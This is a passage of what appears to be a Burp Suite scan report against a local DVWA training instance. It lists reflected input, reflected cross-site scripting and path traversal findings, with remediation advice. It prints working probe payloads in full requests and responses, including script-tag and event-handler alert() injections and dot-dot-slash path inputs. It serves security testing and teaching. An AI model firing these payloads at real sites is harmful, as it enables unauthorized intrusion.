<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:17 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 470<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Help :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/tit<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="28.3">28.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#28.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.1">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#28.3.1">/dvwa/vulnerabilities/view_help.php [id parameter]</a></li>
<li><a href="#28.3.2">/dvwa/vulnerabilities/view_help.php [locale parameter]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="28.3.1">28.3.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_help.php [id parameter]</span>
<br><a class="PREVNEXT" href="#27.3.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#28.3.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_help.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>id</b> request parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_help.php?id=brute<span class="HIGHLIGHT">sm9hwxb337</span>&amp;security=low&amp;locale=en HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=62bnl6i7oso4neelguqvb361e0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:12 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 681<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Help :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/tit<br><b>...[SNIP]...</b><br>&lt;/b&gt;:  file_get_contents(../vulnerabilities/brute<span class="HIGHLIGHT">sm9hwxb337</span>/help/help.php): Failed to open stream: No such file or directory in &lt;b&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="28.3.2">28.3.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_help.php [locale parameter]</span>
<br><a class="PREVNEXT" href="#28.3.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.1.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_help.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>locale</b> request parameter is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_help.php?id=brute&amp;security=low&amp;locale=en<span class="HIGHLIGHT">79divmb7vl</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=62bnl6i7oso4neelguqvb361e0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:14 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 684<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Help :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/tit<br><b>...[SNIP]...</b><br>&lt;/b&gt;:  file_get_contents(../vulnerabilities/brute/help/help.en<span class="HIGHLIGHT">79divmb7vl</span>.php): Failed to open stream: No such file or directory in &lt;b&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="29">29.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php</span>
<br><a class="PREVNEXT" href="#28">Previous</a>
&nbsp;<a class="PREVNEXT" href="#30">Next</a>
<br>
<span class="BODH1" id="29.1">29.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#28.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.2">Next</a>
<br>
<br><span class="TEXT">There are 3 instances of this issue:
<ul>
<li><a href="#29.1.1">/dvwa/vulnerabilities/view_source.php [id parameter]</a></li>
<li><a href="#29.1.2">/dvwa/vulnerabilities/view_source.php [id parameter]</a></li>
<li><a href="#29.1.3">/dvwa/vulnerabilities/view_source.php [security parameter]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="29.1.1">29.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</span>
<br><a class="PREVNEXT" href="#28.3.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.1.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>id</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>aiq50&lt;script&gt;alert(1)&lt;/script&gt;ib4a5</b> was submitted in the id parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=brute<span class="HIGHLIGHT">aiq50%3cscript%3ealert(1)%3c%2fscript%3eib4a5</span>&amp;security=low HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:48 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1062<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;h2&gt;vulnerabilities/brute<span class="HIGHLIGHT">aiq50&lt;script&gt;alert(1)&lt;/script&gt;ib4a5</span>/source/low.php&lt;/h2&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="29.1.2">29.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</span>
<br><a class="PREVNEXT" href="#29.1.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.1.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>id</b> request parameter is copied into the value of an HTML tag attribute which is an event handler and is encapsulated in double quotation marks. The payload <b>35322';alert(1)//414</b> was submitted in the id parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Note that the input is echoed into an existing event handler within the response. JavaScript injected into this context will only execute when the relevant event occurs. This may require some action by the victim user, and may hinder exploitation. It may be possible to manually fine tune an attack to increase the likelihood that the event occurs.</span>
<h2>Remediation detail</h2>
<span class="TEXT">Echoing user-controllable data within an event handler is inherently dangerous and can make XSS attacks difficult to prevent. The defense of HTML-encoding user-controllable data is not effective in this context, because browsers will HTML-decode the event handler string before executing it as script.  If at all possible, the application should avoid echoing user data within this context. </span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=brute<span class="HIGHLIGHT">35322'%3balert(1)%2f%2f414</span>&amp;security=low HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:48 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1032<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;input type="button" value="Compare All Levels" onclick="window.location.href='view_source_all.php?id=brute<span class="HIGHLIGHT">35322';alert(1)//414</span>'"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="29.1.3">29.1.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [security parameter]</span>
<br><a class="PREVNEXT" href="#29.1.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.2.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>xrmyc&lt;script&gt;alert(1)&lt;/script&gt;fnf3d</b> was submitted in the security parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=brute&amp;security=low<span class="HIGHLIGHT">xrmyc%3cscript%3ealert(1)%3c%2fscript%3efnf3d</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:49 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 1017<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;h2&gt;vulnerabilities/brute/source/low<span class="HIGHLIGHT">xrmyc&lt;script&gt;alert(1)&lt;/script&gt;fnf3d</span>.php&lt;/h2&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="29.2">29.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100b00_filepathmanipulation">File path manipulation</a></span>
<br><a class="PREVNEXT" href="#29.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.3">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#29.2.1">/dvwa/vulnerabilities/view_source.php [id parameter]</a></li>
<li><a href="#29.2.2">/dvwa/vulnerabilities/view_source.php [security parameter]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>File path manipulation vulnerabilities arise when user-controllable data is placed into a file or URL path that is used on the server to access local resources, which may be within or outside the web root. If vulnerable, an attacker can modify the file path to access different resources, which may contain sensitive information. Even where an attack is constrained within the web root, it is often possible to retrieve items that are normally protected from direct access, such as application configuration files, the source code for server-executable scripts, or files with extensions that the web server is not configured to serve directly.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be placed into file or URL paths in order to access local resources on the server. This can normally be achieved by referencing known files via an index number rather than their name.</p>
<p>If it is considered unavoidable to place user data into file or URL paths, the data should be strictly validated against a whitelist of accepted values. Note that when accessing resources within the web root, simply blocking input containing file path traversal sequences (such as dot-dot-slash) is not always sufficient to prevent retrieval of sensitive information, because some protected items may be accessible at the original path without using any traversal sequences. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/file-path-traversal">Web Security Academy: Directory traversal</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/23.html">CWE-23: Relative Path Traversal</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/35.html">CWE-35: Path Traversal: '.../...//'</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/36.html">CWE-36: Absolute Path Traversal</a></li>
	<li><a href="https://capec.mitre.org/data/definitions/126.html">CAPEC-126: Path Traversal</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="29.2.1">29.2.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/view_source.php [id parameter]</span>
<br><a class="PREVNEXT" href="#29.1.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#29.2.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/view_source.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>id</b> parameter appears to be vulnerable to file path manipulation attacks. <br><br>The payload <b>./jqp/../brute</b> was submitted in the id parameter. This returned the same content as the base request. The payload <b>.../brute</b> was then submitted, and this returned a different response. This indicates that the application may be vulnerable to file path manipulation.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/view_source.php?id=<span class="HIGHLIGHT">.%2fjqp%2f..%2fbrute</span>&amp;security=low HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=tnhm96uoc7a1ptihhmeqnkilou<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:49 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 7894<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Damn Vulnerable Web Application (DVWA) v1.10 *Development*Source :: Dam<br><b>...[SNIP]...</b><br>&lt;span style="color: #0000BB"&gt;&amp;lt;?php<span class="HIGHLIGHT">&lt;br /&gt;&lt;br /&gt;&lt;/span&gt;&lt;span style="color: #007700"&gt;if(&amp;nbsp;isset(&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'Login'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;]&amp;nbsp;)&amp;nbsp;)&amp;nbsp;{&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Get&amp;nbsp;username&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$user&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&amp;nbsp;&lt;/span&gt;&lt;span style="color: #DD0000"&gt;'username'&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;];&lt;br /&gt;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #FF8000"&gt;//&amp;nbsp;Get&amp;nbsp;password&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$pass&amp;nbsp;&lt;/span&gt;&lt;span style="color: #007700"&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style="color: #0000BB"&gt;$_GET&lt;/span&gt;&lt;span style="color: #007700"&gt;[&amp;nbsp;&lt;/span&gt;&lt;span style="color: 